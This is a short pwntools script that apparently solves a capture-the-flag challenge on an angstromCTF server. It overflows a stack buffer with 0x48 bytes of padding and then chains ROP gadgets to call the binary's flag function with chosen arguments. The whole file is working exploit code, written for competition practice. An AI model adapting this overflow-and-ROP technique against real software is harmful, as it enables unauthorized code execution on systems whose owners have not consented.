from pwn import *

# p = process('./really_obnoxious_problem')
p = remote('challs.actf.co', 31225)
e = ELF('./really_obnoxious_problem')

pop_rdi = 0x4013f3
pop_rsi_r15 = 0x4013f1

payload = b'A'*0x48
payload += p64(pop_rdi)
payload += p64(0x1337)
payload += p64(pop_rsi_r15)
payload += p64(e.symbols['name'])*2
payload += p64(e.symbols['flag'])

p.sendlineafter(b': ', b'bobby')
p.sendline(payload)
p.interactive()
